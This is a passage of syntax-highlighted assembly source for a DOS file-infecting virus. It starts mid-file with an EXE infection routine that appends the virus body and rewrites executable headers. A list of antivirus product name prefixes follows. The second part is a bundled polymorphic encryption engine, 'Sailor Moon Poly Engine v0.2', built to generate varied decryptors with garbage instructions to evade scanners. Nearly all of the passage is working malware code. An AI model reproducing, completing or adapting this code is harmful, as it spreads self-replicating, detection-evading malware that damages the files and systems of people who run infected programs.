                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">isexe</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; virus at cs:0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; no es modif</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">smpe</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">poly_exit_exe_ok</span><span class="sc0">        </span><span class="sc1">; if carry error in poly</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                  </span><span class="sc1">; stack adjust</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">poly_exit_exe_ok</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write virus at end</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; move at start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; rewrite header</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seg_sta</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cs_must_equ_ss</span><span class="sc0">

        </span><span class="sc1">; we must here pay attention if our poly generated an operation</span><span class="sc0">
        </span><span class="sc1">; using BP as pointer. This is because if BP is used and segment</span><span class="sc0">
        </span><span class="sc1">; isn't explicitly given it will assume that we are working on SS</span><span class="sc0">
        </span><span class="sc1">; and not on DS as with other registers as pointers... so if no</span><span class="sc0">
        </span><span class="sc1">; segment is explicitly given in the poly and BP is used we must</span><span class="sc0">
        </span><span class="sc1">; set SS=CS. In other cases SS=CS+1 so 'K' flag will be less often</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; SS = CS + 1</span><span class="sc0">
</span><span class="sc5">cs_must_equ_ss</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; new stack segment</span><span class="sc0">


                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; just after body</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">500h</span><span class="sc0">                 </span><span class="sc1">; some more coz needed</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; new stack pointer</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; one page</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; new length</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">goat_word</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; new length</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

</span><span class="sc5">exitexeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_attr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0143h</span><span class="sc0">                </span><span class="sc1">; set attributes</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">antiviruses</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TB'</span><span class="sc0">    </span><span class="sc1">; TBAV and releated</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AV'</span><span class="sc0">    </span><span class="sc1">; AVP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F-'</span><span class="sc0">    </span><span class="sc1">; F-Prot</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SC'</span><span class="sc0">    </span><span class="sc1">; Scan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MS'</span><span class="sc0">    </span><span class="sc1">; Misc Micro$Hit warez ;-)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FI'</span><span class="sc0">    </span><span class="sc1">; Findvirus</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">; NAv</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CO'</span><span class="sc0">    </span><span class="sc1">; Command</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; end of strings</span><span class="sc0">

</span><span class="sc1">; Int 24h handler. Just go away if error</span><span class="sc0">

</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">; Include poly engine source code</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">spoly.asm</span><span class="sc0">

</span><span class="sc5">virus_normal_encrypt_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; The poly engine has on end poly_mem_used bytes that are used only</span><span class="sc0">
</span><span class="sc1">; in memory</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">old_int24_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;original int24 offset</span><span class="sc0">
</span><span class="sc5">old_int24_seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;original int24 segment</span><span class="sc0">

</span><span class="sc5">exec_letter</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">goat_word</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">exeheader</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">201h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">virus_end_memory</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">size_para</span><span class="sc4">=(</span><span class="sc5">virus_end_memory</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; virus size in memory</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc4">=(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">exe_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">poly_mem_used</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_crypt_size</span><span class="sc4">=(</span><span class="sc5">virus_normal_encrypt_end</span><span class="sc4">-</span><span class="sc5">virus_normal_encrypt_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">crypt_size</span><span class="sc4">=(</span><span class="sc5">virus_crypt_size</span><span class="sc4">-</span><span class="sc5">poly_mem_used</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">pluto</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">exe_start</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------- Everything after this line is the SPOLY.ASM file ---------------</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Sailor Moon Poly Engine v0.2</span><span class="sc0">
</span><span class="sc1">; in:</span><span class="sc0">
</span><span class="sc1">;    CX = bytes to encrypt</span><span class="sc0">
</span><span class="sc1">;    DS:DX = what we are going to encrypt (body of ourselves)</span><span class="sc0">
</span><span class="sc1">;    BP = offset at which it will run</span><span class="sc0">
</span><span class="sc1">;    AL = can ES be modified? (00 = NO (for exes) , 01 = YES (for coms))</span><span class="sc0">
</span><span class="sc1">; it is assumed that DS=CS !!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; out:</span><span class="sc0">
</span><span class="sc1">;    CX,DI = lenght of the generated code</span><span class="sc0">
</span><span class="sc1">;    ES:DX = encrypted code</span><span class="sc0">
</span><span class="sc1">;    BX    = preserved</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">poly_mem_used</span><span class="sc4">=(</span><span class="sc5">poly_data_mem_end</span><span class="sc4">-</span><span class="sc5">poly_data_mem</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">poly_paras</span><span class="sc4">=</span><span class="sc2">400h</span><span class="sc0">                                 </span><span class="sc1">; memory for poly</span><span class="sc0">


</span><span class="sc5">smpe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                          </span><span class="sc1">; store ah flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">es_mody</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_dec_smpe_engine</span><span class="sc0">             </span><span class="sc1">; decrypt engine</span><span class="sc0">

</span><span class="sc5">smpe_encrypted_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">;; Try to allocate the needed memory for the poly stuff</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">; allocate mem for our poly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">poly_paras</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">simple_dec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">   </span><span class="sc1">; we won't encrypt it now,</span><span class="sc0">
                                                </span><span class="sc1">; so don't decrypt it later ;)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; no mem avaiable :(</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; allocated segment</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                              </span><span class="sc1">; save important regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">;; Initialization start</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_to_cx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_inc</span><span class="sc4">],</span><span class="sc2">46h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_lenght</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; save lenght</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc2">3480h</span><span class="sc0">    </span><span class="sc1">; engine initialization</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; clear type selection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">],</span><span class="sc2">09090h</span><span class="sc0">  </span><span class="sc1">; clear rnd value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">second_inc</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">    </span><span class="sc1">; clear second word inc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; clear used registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; clear cx and seg flag</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">; so ES:DI = ES:0</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; initialize encryption</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">simple_dec</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; value for next time</span><span class="sc0">

</span><span class="sc1">;; Initialization end</span><span class="sc0">


</span><span class="sc1">;; Decryption building start</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; decryptor gen. start</span><span class="sc0">
</span><span class="sc5">rndget</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; no sp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rndget</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; no ax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rndget</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                         </span><span class="sc1">; mov _reg16_,immediate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">on_one_side</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">on_one_side</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; 0-2 ROR, 3-7 MATH</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nororing</span><span class="sc0">                        </span><span class="sc1">; select if ror/rol of math</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0b9h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nororing</span><span class="sc0">                        </span><span class="sc1">; if using CX no rol/ror!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; we'll ror/rol</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nororing</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; rol/ror with diff CL</span><span class="sc0">

</span><span class="sc5">nororing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notaword</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; word operation</span><span class="sc0">
</span><span class="sc5">notaword</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_pos</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">; we will fill this later</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; shit stuff</span><span class="sc0">

</span><span class="sc5">isntapnt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; select a pointer</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">isntapnt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isntapnt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; can't be same as counter</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isntapnt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov _reg16_,immediate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

